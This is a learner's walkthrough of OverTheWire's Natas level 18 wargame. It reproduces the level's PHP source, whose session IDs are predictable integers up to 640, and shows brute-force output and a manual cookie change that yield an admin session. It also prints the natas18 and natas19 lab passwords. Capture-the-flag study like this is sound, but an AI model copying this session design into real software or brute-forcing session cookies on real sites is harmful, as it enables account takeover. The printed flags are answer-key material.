# Natas Level 17 → Level 18 PHPSESSID, Insecure Session Management from weak script 

## Previous Flag
<b>6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ</b>

## Goal
Username: natas18<br>
URL: http://natas18.natas.labs.overthewire.org<br>

Please login with your admin account to retrieve credentials for natas19<br>
Username: <br>
Password: <br>
Login

## What I learned
```
# There 640 and PHPSESSID is expected to be an integer value in that range
$maxid = 640;               // 640 should be enough for everyone
random PHPSESSID values are not secure

Badly designed session handling can lead to unauthorized access
    Session IDs are predictable (0 to 639)
    There’s no authentication beyond the session cookie
    And one of those session IDs belongs to an admin

Hacker brute-forcing session IDs by setting PHPSESSID cookie and checking response

# TODO Later 🧠🧠🧠🧠🧠
Another Solution using Burp Suite (I need learn more before doing this method)
https://samxia99.medium.com/overthewire-updated-natas-walkthrough-level-19-4c0d1236206c
```

## Solution
```
Click View source code
http://natas18.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
<?php

$maxid = 640;               // 640 should be enough for everyone 👀

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 👀
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials(); 👀
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials(); 👀
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 scripts/phpSessionIDBruteForce.py ⌨️
PHPSESSID=117
PHPSESSID=118
PHPSESSID=119
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 🔐
</div>
</body>
</html>

PHPSESSID=120
PHPSESSID=121
^C ⌨️                            # Note: Need to manually stop or will do all 640

F12 → Application
Storage → Cookies

Name        Value
PHPSESSID   <Random> → 119
F5 (Refresh Page)

You are an admin. The credentials for the next level are:
Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr 🔐
```

## Flag
<b>tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</b>

## Continue
[Continue](./Natas1819.md)